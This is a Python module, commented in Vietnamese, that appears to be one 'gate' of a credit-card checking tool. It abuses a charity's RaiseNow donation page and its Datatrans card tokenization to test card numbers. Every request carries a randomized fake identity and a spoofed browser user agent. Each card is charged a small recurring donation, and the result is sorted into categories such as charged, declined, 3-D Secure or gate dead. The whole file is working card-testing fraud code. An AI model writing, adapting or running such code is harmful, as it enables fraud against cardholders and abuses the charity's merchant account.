import requests
import json
import logging
import random
import string
import time

# Lấy logger đã được cấu hình từ file chính
logger = logging.getLogger(__name__)

# --- CÁC HÀM TIỆN ÍCH ĐƯỢC SAO CHÉP TỪ FILE KHÁC ---
# Cần thiết để logic của gate hoạt động độc lập

def generate_random_string(length=8):
    """Generates a random string of characters."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    """Generates a random email address."""
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_user_agent():
    """Generates a random realistic User-Agent string."""
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    win_major = random.randint(10, 11)
    win_minor = random.randint(0, 3)
    win_build = random.randint(10000, 22631)
    win_patch = random.randint(0, 500)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = f"{win_major}.{win_minor}; Win64; x64"
    return (
        f"Mozilla/5.0 (Windows NT {win_version}) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

# --- LOGIC CỦA GATE 4 ---

def check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value_func, custom_charge_amount=None):
    """Logic for Gate 4 - Charge 0.5$ Year"""
    try:
        # --- Randomization y chang Gate 1 ---
        user_agent = random_user_agent()
        first_name = generate_random_string(random.randint(10, 15))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()
        charge_value = _get_charge_value_func('4', custom_charge_amount)


        # --- Step 1: Tokenize card (Lấy từ payload bạn cung cấp) ---
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250807155854598300", # formId từ payload của bạn
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877", # merchantId từ payload của bạn
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # --- Step 2: Make Payment Request (Dùng full payload bạn cung cấp) ---
        payment_url = "https://api.raisenow.io/payments"
        payment_headers = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://donate.raisenow.io",
            "referer": "https://donate.raisenow.io/",
            "user-agent": user_agent,
        }
        
        # Sử dụng f-string để tạo payload JSON đầy đủ và chèn các giá trị random
        payment_payload_str = f"""
        {{
            "account_uuid": "8a643026-d8e9-46b8-94dd-5bc94ff11a7c",
            "test_mode": false,
            "create_supporter": false,
            "amount": {{
                "currency": "CHF",
                "value": {charge_value}
            }},
            "supporter": {{
                "locale": "en",
                "first_name": "{first_name}",
                "last_name": "{last_name}",
                "email": "{email}"
            }},
            "raisenow_parameters": {{
                "analytics": {{
                    "channel": "paylink",
                    "preselected_amount": "5000",
                    "suggested_amounts": "[5000,8000,10000]",
                    "user_agent": "{user_agent}"
                }},
                "solution": {{
                    "uuid": "55d69f66-71d4-4240-b718-b200f804399b",
                    "name": "Förderkreise",
                    "type": "donate"
                }},
                "product": {{
                    "name": "tamaro",
                    "source_url": "https://donate.raisenow.io/hwcqr?lng=en",
                    "uuid": "self-service",
                    "version": "2.16.0"
                }},
                "integration": {{
                    "donation_receipt_requested": "false"
                }}
            }},
            "custom_parameters": {{
                "campaign_id": "",
                "campaign_subid": "",
                "rnw_recurring_interval_name": "yearly",
                "rnw_recurring_interval_text": "Yearly"
            }},
            "payment_information": {{
                "brand_code": "eca",
                "cardholder": "{cardholder}",
                "expiry_month": "{mes.zfill(2)}",
                "expiry_year": "{ano}",
                "transaction_id": "{transaction_id}"
            }},
            "profile": "71c2b9d6-7259-4ac6-8087-e41b5a46c626",
            "return_url": "https://donate.raisenow.io/hwcqr?lng=en&rnw-view=payment_result",
            "subscription": {{
                "custom_parameters": {{
                    "campaign_id": "",
                    "campaign_subid": "",
                    "rnw_recurring_interval_name": "yearly",
                    "rnw_recurring_interval_text": "Yearly"
                }},
                "raisenow_parameters": {{
                    "analytics": {{
                        "channel": "paylink",
                        "preselected_amount": "5000",
                        "suggested_amounts": "[5000,8000,10000]",
                        "user_agent": "{user_agent}"
                    }},
                    "solution": {{
                        "uuid": "55d69f66-71d4-4240-b718-b200f804399b",
                        "name": "Förderkreise",
                        "type": "donate"
                    }},
                    "product": {{
                        "name": "tamaro",
                        "source_url": "https://donate.raisenow.io/hwcqr?lng=en",
                        "uuid": "self-service",
                        "version": "2.16.0"
                    }},
                    "integration": {{
                        "donation_receipt_requested": "false"
                    }}
                }},
                "recurring_interval": "7 8 *",
                "timezone": "Asia/Bangkok"
            }}
        }}
        """
        
        # Chuyển chuỗi JSON thành dictionary để gửi
        payment_payload = json.loads(payment_payload_str)

        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
        if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
        
        response_text = payment_response.text

        # --- Key Check y hệt Gate 1 (Charge mode) ---
        if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        
        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 4 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 4 System Error: {e}", bin_info
